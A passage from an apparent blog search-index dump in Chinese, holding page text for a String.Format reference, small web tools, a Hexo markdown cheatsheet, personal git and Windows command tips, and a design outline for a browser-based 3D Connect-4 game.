dddd, MMMM dd, yyyy HH:mm:ss g 一般格式 (short date + short time) MM/dd/yyyy HH:mm G 一般格式 (short date + long time) MM/dd/yyyy HH:mm:ss m,M 月日格式 MMMM dd\\ns 适中日期时间格式 yyyy-MM-dd HH:mm:ss t 精简时间格式 HH:mm\\nT 详细时间格式 HH:mm:ss string.format格式结果 String.Format © Currency: . . . . . . . . ($123.00) (D) Decimal:. . . . . . . . . -123 (E) Scientific: . . . . . . . -1.234500E+002 (F) Fixed point:. . . . . . . -123.45 (G) General:. . . . . . . . . -123 (N) Number: . . . . . . . . . -123.00 (P) Percent:. . . . . . . . . -12,345.00 % ® Round-trip: . . . . . . . -123.45 (X) Hexadecimal:. . . . . . . FFFFFF85 (d) Short date: . . . . . . . 6/26/2004 (D) Long date:. . . . . . . . Saturday, June 26, 2004 (t) Short time: . . . . . . . 8:11 PM (T) Long time:. . . . . . . . 8:11:04 PM (f) Full date/short time: . . Saturday, June 26, 2004 8:11 PM (F) Full date/long time:. . . Saturday, June 26, 2004 8:11:04 PM (g) General date/short time:. 6/26/2004 8:11 PM (G) General date/long time: . 6/26/2004 8:11:04 PM (M) Month:. . . . . . . . . . June 26 ® RFC1123:. . . . . . . . . Sat, 26 Jun 2004 20:11:04 GMT (s) Sortable: . . . . . . . . 2004-06-26T20:11:04 (u) Universal sortable: . . . 2004-06-26 20:11:04Z (invariant) (U) Universal sortable: . . . Sunday, June 27, 2004 3:11:04 AM (Y) Year: . . . . . . . . . . June, 2004 (G) General:. . . . . . . . . Green (F) Flags:. . . . . . . . . . Green (flags or integer) (D) Decimal number: . . . . . 3 (X) Hexadecimal:. . . . . . . 00000003 说明： String.Format 将指定的 String 中的每个格式项替换为相应对象的值的文本等效项。 例子： int iVisit = 100; string szName = &quot;Jackfled&quot;; Response.Write(String.Format(&quot;您的帐号是：{0} 。访问了 {1} 次.&quot;, szName, iVisit));","lang":"zh-CN"},{"title":"指南","date":"un22fin22","updated":"un66fin66","comments":false,"path":"zh-CN/pages/useful-information/guides.html","permalink":"https://neo01.com/zh-CN/pages/useful-information/guides.html","excerpt":"","text":"Mac [在 MacOS 上更改 Java 版本] http://www.guigarage.com/2013/02/change-java-version-on-mac-os/ 其他 ASP.NET string.Format（中文）","lang":"zh-CN"},{"title":"学习资源","date":"un22fin22","updated":"un66fin66","comments":false,"path":"zh-CN/pages/useful-information/learning.html","permalink":"https://neo01.com/zh-CN/pages/useful-information/learning.html","excerpt":"","text":"架构 Microsoft Azure 架构中心 编程 CodeSchool CodeFight HackerRank CodeCombat CodinGame 学习 Git 分支 使用交互式浏览器场景学习 Kubernetes 网络安全 (ISC)2 国际信息系统安全认证联盟 其他 高性能浏览器网络 联合国气候变化学习","lang":"zh-CN"},{"title":"大小写转换器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/case-converter/index.html","permalink":"https://neo01.com/zh-CN/tools/case-converter/index.html","excerpt":"","text":"要转换的文字： Hello World! This is a Sample Text.","lang":"zh-CN"},{"title":"实用工具","date":"un22fin22","updated":"un66fin66","comments":false,"path":"zh-CN/pages/useful-information/useful_tools.html","permalink":"https://neo01.com/zh-CN/pages/useful-information/useful_tools.html","excerpt":"","text":"asciinema - 录制 ASCII 并播放的工具。对演示很有用。 网络安全 Snort (IDS)","lang":"zh-CN"},{"title":"Hexo 博客速查表","date":"un44fin44","updated":"un55fin55","comments":false,"path":"zh-CN/pages/Hexo-Blogging-Cheatsheet/index.html","permalink":"https://neo01.com/zh-CN/pages/Hexo-Blogging-Cheatsheet/index.html","excerpt":"","text":"此页面也用于测试文章和页面中使用的组件。 实用链接 Hexo 文档 维基百科上的 XML 和 HTML 字符实体参考列表 我的博客信息 检查我的域名是否在中国大陆被封锁 设计 Font Awesome 常用表情符号 😄 :D(快捷键) 😄 :smile: 😊 :blush: 😍 :heart_eyes: 😓 :sweat: 👍 :thumbsup: 😋 :yum: 😰 :cold_sweat: 😱 :scream: 😭 :sob: 😜 :stuck_out_tongue_winking_eye: 😗 :kissing: 😪 :sleepy: 💩 :poop: ✌️ :v: 💯 :100: 🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil: 💋 :kiss: 💀 :skull: 💧 :droplet: 🎆 :fireworks: 📢 :loudspeaker: ⚠️ :warning: 🚫 :no_entry_sign: ✅ :white_check_mark: ❌ :x: ㊙️ :secret: ⁉️ :interrobang: ‼️ :bangbang: 更多请参考 Emoji Cheatsheet CSS 按键 Control &lt;kbd&gt;Contro&lt;/kbd&gt; Shift ⇧ &lt;kbd&gt;Shift &amp;#x21E7;&lt;/kbd&gt; - 使用 Unicode 字符 Markdown（含插件） ++Inserted++ Inserted 脚注 [^1] 用于标记[1]，[^1]: 用于注释 如果 markdown 在 {{}} 或 {%%} 上造成问题，请使用 {% raw %}{% endraw %} Youtube 视频 {% youtube [youtube id] %} 操作 Markdown 示例 下标 H~2~0 H20 上标 x^2^ x2 粗体 **bold** bold 斜体 *italic* italic 粗体和斜体 ***bold and italic*** bold and italic 标记 ==marked== marked 删除线 ~~strikethrough~~ strikethrough 行内代码 `inline code` inline code 链接 [link text](https://example.com) link text 图片 ![alt text](https://example.com/image.jpg) 使用样式类的属性，例如： # header &#123;.style-me&#125; paragraph &#123;data-toggle&#x3D;modal&#125; paragraph *style me*&#123;.red&#125; more text 输出 &lt;h1 class&#x3D;&quot;style-me&quot;&gt;header&lt;&#x2F;h1&gt; &lt;p data-toggle&#x3D;&quot;modal&quot;&gt;paragraph&lt;&#x2F;p&gt; &lt;p&gt;paragraph &lt;em class&#x3D;&quot;red&quot;&gt;style me&lt;&#x2F;em&gt; more text&lt;&#x2F;p&gt; 表格列对齐 代码： | 默认 | 左对齐 | 居中 | 右对齐 | | --- | :-- | :-: | --: | | 1 | 1 | 1 | 1 | | 22 | 22 | 22 | 22 | | 333 | 333 | 333 | 333 | 结果： 默认 左对齐 居中 右对齐 1 1 1 1 22 22 22 22 333 333 333 333 引用块 代码： &gt; 一些引用文字 结果： 一些引用文字 有序列表 代码： 1. 项目 1 2. 项目 2 结果： 项目 1 项目 2 无序列表 代码： - 项目 1 - 项目 2 结果： 项目 1 项目 2 水平线 代码： --- 结果： 代码块 结果： 代码块 代码： ~~~ 代码块 ~~~ Github 卡片 用户 代码： &#123;% githubCard user:neoalienson %&#125; neo.alienson @neoalienson 📍 Hong Kong 🔗 https://01man.com 📁 43 Repositories ⭐ 22 Stars 📈 34 Commits 👥 14 Followers 🔄 20 Pull Requests ❗ 0 Issues JavaScript 44.4% Swift 11.1% Dart 8.3% Python 8.3% TypeScript 8.3% Other 19.4% 仓库 代码： &#123;% githubCard user:neoalienson repo:pachinko %&#125; 结果： 📖 neoalienson/pachinko An iOS 'pinball' game using SpriteKit and Swift with physics engine ⭐ 7 Stars 🍴 1 Forks Language: C++ Mermaid JS 预渲染。 代码： &#123;% mermaid %&#125; block-beta columns 1 db((&quot;DB&quot;)) blockArrowId6&lt;[&quot;&nbsp;&nbsp;&nbsp;&quot;]&gt;(down) block:ID A B[&quot;A wide one in the middle&quot;] C end space D ID --&gt; D C --&gt; D style B fill:#969,stroke:#333,stroke-width:4px &#123;% endmermaid %&#125; 结果： block-beta columns 1 db((\"DB\")) blockArrowId6(down) block:ID A B[\"A wide one in the middle\"] C end space D ID --> D C --> D style B fill:#969,stroke:#333,stroke-width:4px 实时渲染 block-beta columns 1 db((\"DB\")) blockArrowId6(down) block:ID A B[\"A wide one in the middle\"] C end space D ID --> D C --> D style B fill:#969,stroke:#333,stroke-width:4px 柱状图 结果： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_71de5a2c9')); var option = { \"title\": { \"text\": \"各操作系统的临时端口范围\" }, \"tooltip\": {}, \"xAxis\": { \"type\": \"category\", \"data\": [\"Linux (旧)\", \"Linux (新)\", \"Windows\", \"FreeBSD\", \"macOS\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"端口数量\" }, \"series\": [{ \"type\": \"bar\", \"data\": [28233, 28232, 16384, 55536, 16384], \"itemStyle\": { \"color\": \"#1976d2\" } }] }; chart.setOption(option); } })(); 代码： &#123;% echarts %&#125; &#123; &quot;title&quot;: &#123; &quot;text&quot;: &quot;各操作系统的临时端口范围&quot; &#125;, &quot;tooltip&quot;: &#123;&#125;, &quot;xAxis&quot;: &#123; &quot;type&quot;: &quot;category&quot;, &quot;data&quot;: [&quot;Linux (旧)&quot;, &quot;Linux (新)&quot;, &quot;Windows&quot;, &quot;FreeBSD&quot;, &quot;macOS&quot;] &#125;, &quot;yAxis&quot;: &#123; &quot;type&quot;: &quot;value&quot;, &quot;name&quot;: &quot;端口数量&quot; &#125;, &quot;series&quot;: [&#123; &quot;type&quot;: &quot;bar&quot;, &quot;data&quot;: [28233, 28232, 16384, 55536, 16384], &quot;itemStyle&quot;: &#123; &quot;color&quot;: &quot;#1976d2&quot; &#125; &#125;] &#125; &#123;% endecharts %&#125; 脚注示例 ↩︎","lang":"zh-CN"},{"title":"实用信息","date":"un22fin22","updated":"un55fin55","comments":false,"path":"zh-CN/pages/useful-information/index.html","permalink":"https://neo01.com/zh-CN/pages/useful-information/index.html","excerpt":"","text":"关于 此页面包含对我自己有用的信息。它也作为此博客的测试页面。 常用提示 将字符串从博客标题转换为 Linux 友好的文件名。 convert string by replacing colon with dash, nonnalpha numeric with underscore. reduce repetiting underscore or dash to single underscore or dash: 软件开发 安全性 Instrumentation tookit 执行命令时遮罩敏感信息（如 Proxy-Authorization）， curl -v https://somewhere.need.authenticated.proxy 2&gt;&amp;1 | sed -E &quot;s/(proxy-authorization:).*/\\\\1: ***/i&quot; Nessus OWASP SANS Vulnerability Database 其他 Creating an Alpine Linux package Visual Studio Code Keyboard Shortcuts for Windows 常用命令 立即关闭 Windows shutdown -r -t 0，当你远程连接到 Windows PC 时很有用 切换 Java 版本 export JAVA_HOME&#x3D;&#96;&#x2F;usr&#x2F;libexec&#x2F;java_home -v 1.8&#96; Git 撤销（未推送） git reset --soft HEAD~ 删除远程分支 git push [remote] --delete [branch] 例如：git push origin --delete feature/branch 同步远程分支并删除远程不存在的本地副本 git fetch --prune 列出分支之间的提交差异 git rev-list [branch]...[another branch] 列出分支之间的提交差异，箭头指示哪个分支拥有该提交 git rev-list --left-right [branch]...[another branch] 列出分支相对于远程分支的领先/落后提交 git rev-list [branch]...[remote]/[another branch] 显示分支之间的领先或落后数量 git rev-list --left-right count [branch]...[another branch] 使用最新提交更新子模块 git submodule update --remote 清理孤立提交 git gc --prune=now --aggressive Windows 移除 XBox 使用 Powershell 移除 XBox Get-ProvisionedAppxPackage -Online | Where-Object &#123; $_.PackageName -match &quot;xbox&quot; &#125; | ForEach-Object &#123; Remove-ProvisionedAppxPackage -Online -AllUsers -PackageName $_.PackageName &#125; 检查是否还有 Xbox 应用程序 dism /Online /Get-ProvisionedAppxPackages | Select-String PackageName | Select-String xbox Windows 快捷键 仅列出常用且容易忘记的快捷键。 将窗口移至另一个屏幕 ⊞ Windows + ⇧ Shift + ← / → 切换到另一个桌面 ⊞ Windows + ⌃ Control + ← / → 任务视图 ⊞ Windows + Tab 打开操作中心 ⊞ Windows + A 显示/隐藏桌面 ⊞ Windows + D 打开文件资源管理器 ⊞ Windows + E 快速链接菜单（系统工具如事件查看器） ⊞ Windows + X 锁定 ⊞ Windows + L 编辑 切换语音输入 ⊞ Windows + H 打开剪贴板历史记录 ⊞ Windows + ⌃ Control + V 粘贴为纯文本[1] ⊞ Windows + V[2] 截取屏幕并 OCR 到剪贴板[1:1] ⊞ Windows + T[2:1] 表情符号 ⊞ Windows + .[2:2] Visual Studio Code 快捷键 仅列出常用且容易忘记的快捷键。参考自 https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf 基本 用户设置 ⌃ Control + , 选择所有匹配项 Alt + Enter 快速修复 ⌃ Control&lt; + . Ctrl+K Ctrl+X ⌃ Control&lt; + K ⌃ Control&lt; + X 导航 转到行… ⌃ Control + G 转到文件… ⌃ Control + P 转到下一个错误或警告 F8 聚焦到第 1、2 或 3… 编辑器组 ⌃ Control + 1/2/3… 拆分编辑器 ⌃ Control + \\ 显示集成终端 ⌃ Control + ` 创建新终端 ⌃ Control + ⇧ Shift + ` 显示资源管理器 / 切换焦点 ⌃ Control + ⇧ Shift + E 显示搜索 ⌃ Control + ⇧ Shift + S 显示源代码管理 ⌃ Control + ⇧ Shift + G 显示调试 ⌃ Control + ⇧ Shift + D 显示扩展 ⌃ Control + ⇧ Shift + X 在文件中替换 ⌃ Control + ⇧ Shift + H 显示输出面板 ⌃ Control + ⇧ Shift + U 在侧边打开 Markdown 预览 ⌃ Control + K V 调试 切换断点 F9 开始/继续 F5 单步跳过 F10 单步调试 F11 单步跳出 ⇧ Shift + F11 其他 指南 学习 工具 需要 PowerToys ↩︎ ↩︎ 自定义快捷键 ↩︎ ↩︎ ↩︎","lang":"zh-CN"},{"title":"Base64 编码器/解码器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/base64-converter/index.html","permalink":"https://neo01.com/zh-CN/tools/base64-converter/index.html","excerpt":"","text":"URL Safe Input Text: 编码 to Base64 解码 from Base64 输出： 复制","lang":"zh-CN"},{"title":"ASCII 文字绘制器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/ascii-text-drawer/index.html","permalink":"https://neo01.com/zh-CN/tools/ascii-text-drawer/index.html","excerpt":"","text":"要转换的文字： 字体类别： Popular 3D & Effects Small & Compact Decorative Script & Cursive Tech & Digital Block & Solid Banner & Headers Monospace Themed & Special Geometric Retro & Vintage Stylized & Effects Artistic & Creative Money Fonts Named Fonts AMC Collection Efti Collection Miscellaneous All Fonts 复制 to Clipboard","lang":"zh-CN"},{"title":"Crontab 生成器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/crontab-generator/index.html","permalink":"https://neo01.com/zh-CN/tools/crontab-generator/index.html","excerpt":"","text":"Minute (0-59) Every minute 0 Every 5 minutes Every 10 minutes Every 15 minutes Every 30 minutes Hour (0-23) Every hour 0 (midnight) 6 AM 12 PM (noon) 6 PM Day (1-31) Every day 1st 15th Every 7 days Month (1-12) Every month January June December Weekday (0-7) Every day Sunday Monday Tuesday Wednesday Thursday Friday Saturday 复制 Cron Expression * * * * * Runs every minute","lang":"zh-CN"},{"title":"EXIF 提取器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/exif-extractor/index.html","permalink":"https://neo01.com/zh-CN/tools/exif-extractor/index.html","excerpt":"","text":"Upload or drag and drop a JPEG image to extract and analyze its EXIF metadata information. 📁 Click here or drag and drop a JPEG file","lang":"zh-CN"},{"title":"计时器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/chronometer/index.html","permalink":"https://neo01.com/zh-CN/tools/chronometer/index.html","excerpt":"","text":"00:00:00.000 开始 暂停 停止 重置 计圈 Lap Times","lang":"zh-CN"},{"title":"表情符号选择器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/emoji-picker/index.html","permalink":"https://neo01.com/zh-CN/tools/emoji-picker/index.html","excerpt":"","text":"Emoji copied!","lang":"zh-CN"},{"title":"Chmod 计算器","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-CN/tools/chmod-calculator/index.html","permalink":"https://neo01.com/zh-CN/tools/chmod-calculator/index.html","excerpt":"","text":"File Permissions: Owner Group Others Read Write Execute 复制 Octal Notation 644 复制 Symbolic Notation rw-r--r-- 复制 Umask 022 Or enter octal value:","lang":"zh-CN"},{"title":"设备信息","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/device-information/index.html","permalink":"https://neo01.com/zh-CN/tools/device-information/index.html","excerpt":"","text":"","lang":"zh-CN"},{"title":"JSON 到 YAML 转换器","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-CN/tools/json-yaml-converter/index.html","permalink":"https://neo01.com/zh-CN/tools/json-yaml-converter/index.html","excerpt":"","text":"Pretty Format 输入： JSON to YAML YAML to JSON 输出： 复制","lang":"zh-CN"},{"title":"NATO 字母转换器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/nato-alphabet/index.html","permalink":"https://neo01.com/zh-CN/tools/nato-alphabet/index.html","excerpt":"","text":"Text to convert to NATO alphabet: Hello World","lang":"zh-CN"},{"title":"哈希文字","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-CN/tools/hash-text/index.html","permalink":"https://neo01.com/zh-CN/tools/hash-text/index.html","excerpt":"","text":"Text to hash: Hello World!","lang":"zh-CN"},{"title":"IPv4 子网计算器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/ipv4-subnet-calculator/index.html","permalink":"https://neo01.com/zh-CN/tools/ipv4-subnet-calculator/index.html","excerpt":"","text":"IP Address with CIDR (e.g., 192.168.1.0/24): Class A (/8) Class B (/16) Class C (/24)","lang":"zh-CN"},{"title":"JSON 验证器与格式化器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/json-validator/index.html","permalink":"https://neo01.com/zh-CN/tools/json-validator/index.html","excerpt":"","text":"Input JSON {\"name\":\"John\",\"age\":30,\"city\":\"New York\",\"hobbies\":[\"reading\",\"swimming\"]} 排序 Keys: Indent: 2 spaces 4 spaces Tab 格式化 压缩 清除 Formatted Output 复制","lang":"zh-CN"},{"title":"PNG 元数据检查器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/png-metadata-checker/index.html","permalink":"https://neo01.com/zh-CN/tools/png-metadata-checker/index.html","excerpt":"","text":"Upload or drag and drop a PNG file to extract and analyze its metadata information. 📁 Click here or drag and drop a PNG file","lang":"zh-CN"},{"title":"温度转换器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/temperature-converter/index.html","permalink":"https://neo01.com/zh-CN/tools/temperature-converter/index.html","excerpt":"","text":"Temperature value:","lang":"zh-CN"},{"title":"Mermaid 图表编辑器","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-CN/tools/mermaid-editor/index.html","permalink":"https://neo01.com/zh-CN/tools/mermaid-editor/index.html","excerpt":"","text":"Mermaid Code Flowchart Sequence Gantt Pie Chart Class Diagram graph TD A[Start] --> B{Is it?} B -->|Yes| C[OK] C --> D[Rethink] D --> B B ---->|No| E[End] Render 清除 复制 Code Diagram Output Zoom In Zoom Out 重置 Zoom 下载 SVG Enter Mermaid code above and click Render to see the diagram...","lang":"zh-CN"},{"title":"SQL 美化器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/sql-prettify/index.html","permalink":"https://neo01.com/zh-CN/tools/sql-prettify/index.html","excerpt":"","text":"SQL to format: SELECT u.id, u.name, p.title FROM users u JOIN posts p ON u.id = p.user_id WHERE u.active = 1 AND p.published = 1 ORDER BY p.created_at DESC; Keyword Case: UPPER lower Preserve Indent Style: Standard Tabular Left Tabular Right 格式化 SQL 压缩 SQL 复制 Formatted SQL","lang":"zh-CN"},{"title":"文字统计","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/text-statistics/index.html","permalink":"https://neo01.com/zh-CN/tools/text-statistics/index.html","excerpt":"","text":"Text to analyze: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.","lang":"zh-CN"},{"title":"X.509 证书解码器","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-CN/tools/x509-decoder/index.html","permalink":"https://neo01.com/zh-CN/tools/x509-decoder/index.html","excerpt":"","text":"X.509 证书（PEM 格式）： 解码 Certificate 清除 复制 All 文字格式 复制 Sample 测试用示例证书 -----BEGIN CERTIFICATE----- MIIE/TCCA+WgAwIBAgISBnY9ugTPoh5t2QcBI3lLRT7NMA0GCSqGSIb3DQEBCwUA MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD EwNSMTEwHhcNMjUwODE5MjExOTM4WhcNMjUxMTE3MjExOTM3WjAUMRIwEAYDVQQD EwluZW8wMS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCYmFjr 7Mu2d4HocA6HIjHv0mNjZwGckE4QFpSc9Rm2BTBWtoJBYtQxC3nA1OHBNhMfXHAW IdAcUxOMPAyMXRVH+MeUKUGPwuOyKbYbd42oc+rYY5E30iZQYaEEvfp2IgaloD3c B0uPtwYktheSLsmu3BYsLMNslCMtn53UQNqYJj1nhze2TKSj7lIx44cs7TjucKW1 mH3Dh5b7LkVsomwk/2NCtuR81F9rlnMkegyliWiG8XEDeVMOiBxuWqXwgAxmDaSi ILW5CRwANY88iaeKjE5X/R4oGTpj0FYD6fUyDTdAP5qQcTPX17R+QUi0BaqO92U2 h4dmyv9tg0PvSKyNAgMBAAGjggIoMIICJDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0l BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYE FFjJsqpo5qVIzNgr6EKyv3++RWZoMB8GA1UdIwQYMBaAFMXPRqTq9MPAemyVxC2w XpIvJuO5MDMGCCsGAQUFBwEBBCcwJTAjBggrBgEFBQcwAoYXaHR0cDovL3IxMS5p LmxlbmNyLm9yZy8wIwYDVR0RBBwwGoIJbmVvMDEuY29tgg13d3cubmVvMDEuY29t MBMGA1UdIAQMMAowCAYGZ4EMAQIBMC4GA1UdHwQnMCUwI6AhoB+GHWh0dHA6Ly9y MTEuYy5sZW5jci5vcmcvNzguY3JsMIIBBAYKKwYBBAHWeQIEAgSB9QSB8gDwAHcA pELFBklgYVSPD9TqnPt6LSZFTYepfy/fRVn2J086hFQAAAGYxGlA4QAABAMASDBG AiEA+tVCCFfQfZzo2+t2cAYAodoV/h7QNOz4WRMlw59O3hwCIQDzd0xLuxcb/N3X +W/Rtasm6Cx+NUkwkEuwKUAxiElYKAB1ABoE/0nQVB1Ar/agw7/x2MRnL07s7iNA aJhrF0Au3Il9AAABmMRpQVwAAAQDAEYwRAIgGni1NW3egKdCHsYWOd2qJWaGtd0l nbxhbr5FWLmj5GACIBK5VTijGZMCVSM6JCAcVpOWhf3grxTi2MRzt879mdtVMA0G CSqGSIb3DQEBCwUAA4IBAQAENCXxsMuo/QrGuzqvrIh1nlFgiNiQZczA1Lged1U5 ZD1TNZM2JuW0xJQ4eWv4AOEYL28RjHLx0TBQtDQRapufl6MBJ6I/JRi+5cklYyA4 r8cyVAqM38QJxOezXsLPCkDdeqWOcdAAXoMrMDicu0ozgB7mCRjtUwvZthP1ZDwj z+teSsdRD4o8s7JDGUiDtWlQvNPAEnCOwwVLfEvVDWU/C77wc3eyy9jLlPwM+3fb ZieuluG8dYhK7yQni4za5FlP0TbZE9sATFEdxL9ttLaUwqRJ6gPMDyilbf4RHQIP 6TOUuLQwBdMT7fbsAnhkZaaZbTZqR9uhefKhFm5Urx3k -----END CERTIFICATE----- function copySampleCert() { const sampleCert = document.getElementById('sampleCert').textContent; copyText(sampleCert); }","lang":"zh-CN"},{"title":"URL 编码器/解码器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/url-encoder/index.html","permalink":"https://neo01.com/zh-CN/tools/url-encoder/index.html","excerpt":"","text":"Text to encode/decode: Hello World! This is a test URL: https://example.com/path?param=value&other=test 编码 解码 复制 Result","lang":"zh-CN"},{"title":"Connected 4 in 3D 提示詞","date":"un66fin66","updated":"un66fin66","comments":true,"path":"zh-TW/games/connected_4_3d/prompt.html","permalink":"https://neo01.com/zh-TW/games/connected_4_3d/prompt.html","excerpt":"","text":"Connected 4 in 3D：技術方法與遊戲邏輯 本文件概述了為網頁瀏覽器建構 3D Connected 4 遊戲的概念方法，專注於使用 JavaScript 和 Three.js 進行渲染的純網頁實作。 第一部分：技術方法（純網頁與 Three.js） 該遊戲將是使用 HTML、CSS 和 JavaScript 建構的單頁網頁應用程式。Three.js 將用於所有 3D 渲染。 建議架構： HTML 結構 (index.html)： 將包含用於 Three.js 渲染的 canvas 元素。 將包含遊戲狀態和控制項的基本 UI 元素（例如重置按鈕）。 樣式 (style.css)： 將為 HTML 元素和 canvas 提供基本樣式。 遊戲邏輯和 3D 渲染 (script.js)： 這個單一 JavaScript 檔案將封裝核心遊戲邏輯和 Three.js 渲染。 Three.js 設定： 初始化 3D 場景、相機和 WebGL 渲染器。 3D 棋盤和棋子： 使用 Three.js 幾何體視覺化建立 5x5x5 網格（例如，棋盤孔使用圓柱體，棋子使用球體）。 使用者互動： 實作滑鼠事件監聽器和 Three.js 光線投射以偵測使用者在 3D 棋盤上的點擊，將螢幕座標轉換為 3D 網格位置。 遊戲狀態視覺化： 更新 3D 場景以反映當前遊戲狀態（例如，新增新棋子、清除棋盤）。 工作流程範例： 網頁載入： index.html 載入，style.css 套用樣式，script.js 執行。 Three.js 場景初始化： script.js 設定 Three.js 場景，渲染空的 3D 網格，並設定事件監聽器。 使用者點擊 3D 棋盤： 偵測到滑鼠點擊事件。 光線投射： Three.js 從點擊位置執行光線投射到 3D 場景中，以確定目標網格單元格 (x, z)。 遊戲邏輯處理： JavaScript 遊戲邏輯接收 (x, z) 座標，確定棋子的 y（垂直）位置，更新其內部棋盤狀態，並檢查勝利/平局條件。 3D 場景更新： JavaScript 程式碼指示 Three.js 在計算的 (x, y, z) 座標處新增新的 3D 棋子，並使用當前玩家的顏色。 遊戲狀態更新： HTML UI 更新以反映當前遊戲狀態（例如，下一個玩家的回合、勝利/平局訊息）。 第二部分：核心遊戲邏輯（JavaScript） 3D Connected 4 的核心遊戲邏輯將在 JavaScript 中實作。此邏輯管理遊戲狀態、玩家回合、棋子放置規則和勝利/平局條件。 以下概述了核心遊戲邏輯的當前實作： 1. 遊戲棋盤表示 3D 遊戲棋盤表示為整數的三維陣列： let board; &#x2F;&#x2F; 將初始化為 new Array(5).fill(0).map(() &#x3D;&gt; new Array(5).fill(0).map(() &#x3D;&gt; new Array(5).fill(0))); board[x][y][z] 表示 5x5x5 立方體中的一個單元格。 x、y、z 範圍從 0 到 4。 0：表示空單元格。 1：表示玩家 1 放置的棋子（例如紅色）。 2：表示玩家 2 放置的棋子（例如黃色）。 2. 遊戲狀態管理 遊戲狀態由幾個變數管理： let currentPlayer = 1;：追蹤輪到誰（1 或 2）。 let gameOver = false;：指示遊戲是否已結束（勝利或平局）。 let gameStatus = &quot;Player 1's Turn&quot;;：顯示當前遊戲狀態的字串（例如「玩家 1 的回合」、「玩家 2 獲勝！」、「平局！」）。 3. 遊戲初始化 (initializeGame()) 此方法設定新遊戲： 將 board 重置為全零（空）。 將 currentPlayer 設回 1。 將 gameOver 設為 false。 將 gameStatus 更新為「玩家 1 的回合」。 清除 3D 場景中的所有現有棋子。 4. 棋子放置邏輯 (addPiece(x, z)) 此方法處理在遊戲中放置棋子： 輸入： 從使用者輸入取得 x（列）和 z（深度）座標。 遊戲結束檢查： 如果 gameOver 為 true，該方法立即返回。 尋找最低可用 y： 它從底部 (y=0) 向上迭代，以在所選列 (x, z) 中找到第一個空單元格 (board[x][i][z] == 0)。這模擬重力。 放置棋子： 如果找到空的 y 位置： 在 board[x][y][z] 處使用 currentPlayer 的值更新 board。 在計算的 (x, y, z) 座標處將新的 3D 棋子新增到 Three.js 場景中，並使用當前玩家的顏色。 檢查勝利/平局條件： 放置棋子後，它呼叫 checkWin() 和 checkDraw() 以確定下一個遊戲狀態。 更新遊戲狀態： 根據結果（勝利、平局或下一個玩家的回合）更新 gameStatus。 切換玩家： 如果遊戲未結束，currentPlayer 切換到另一個玩家。 5. 勝利條件檢查 (checkWin(x, y, z)) 這是遊戲邏輯中最複雜的部分。它檢查從新放置的棋子 (x, y, z) 開始，在 13 個可能的 3D 方向中的任何一個方向上是否有 4 個連續的 currentPlayer 顏色的棋子。 13 個方向是： 3 個軸向方向： X 軸：(1, 0, 0) Y 軸：(0, 1, 0) Z 軸：(0, 0, 1) 6 個平面對角線方向： XY 平面：(1, 1, 0)、(1, -1, 0) XZ 平面：(1, 0, 1)、(1, 0, -1) YZ 平面：(0, 1, 1)、(0, 1, -1) 4 個空間對角線方向： (1, 1, 1) (1, 1, -1) (1, -1, 1) (1, -1, -1) checkWin 方法為每個方向呼叫 checkLine。 6. 線檢查 (checkLine(x, y, z, dx, dy, dz)) 此輔助方法從給定的 (x, y, z) 座標開始，檢查特定方向 (dx, dy, dz) 的勝利： 它沿著由起點和方向定義的線迭代，從起點檢查正負方向最多 4 個位置。 它計算 currentPlayer 顏色的連續棋子。 如果找到 4 個或更多連續棋子，它返回 true（勝利）。 它處理邊界條件（確保 curX、curY、curZ 保持在 0-4 範圍內）。 7. 平局條件檢查 (checkDraw()) 此方法確定遊戲是否為平局： 它迭代 board 上的每個單元格。 如果它找到任何空單元格 (0)，這意味著棋盤未滿，因此不是平局，返回 false。 如果所有單元格都已填滿（未找到 0），它返回 true（平局）。 此詳細大綱提供了對遊戲結構和邏輯的清晰理解，這將使用 JavaScript 和 Three.js 實作。","lang":"zh-TW"},{"title":"Cookie 政策","date":"un11fin11","updated":"un66fin66","comments":true,"path":"zh-TW/pages/cookie-policy/index.html","permalink":"https://neo01.com/zh-TW/pages/cookie-policy/index.html","excerpt":"","text":"最後更新： 2024 年 1 月 1 日 什麼是 Cookie Cookie 是當您造訪我們的網站時儲存在您裝置上的小型文字檔案。它們幫助我們為您提供更好的瀏覽體驗並分析我們網站的使用情況。 我們使用的 Cookie 類型 必要 Cookie 這些 Cookie 是網站正常運作所必需的，無法停用。 工作階段 Cookie： 